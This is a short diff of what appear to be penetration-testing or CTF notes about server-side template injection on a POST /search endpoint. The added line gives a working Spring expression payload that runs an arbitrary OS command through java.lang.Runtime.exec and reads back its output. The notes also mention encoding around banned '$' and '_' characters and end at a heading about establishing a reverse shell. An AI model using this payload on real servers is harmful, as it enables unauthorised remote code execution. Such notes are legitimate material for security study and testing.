@@ -5,7 +5,7 @@
 - Possible SSTI (POST HTTP endpoint /search) payload = "name='*{ssti}'" (not possible with dollar sign for some reason)
 
 - Not let's remember that $ and _ characters are banned, so we need to use the SSTI-PAYLOAD generator that will encode it to another format
-- The payload looks like this: 
+- The payload looks like this: *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('the command').getInputStream())}
 
 
 # How to estabilish reverse shell
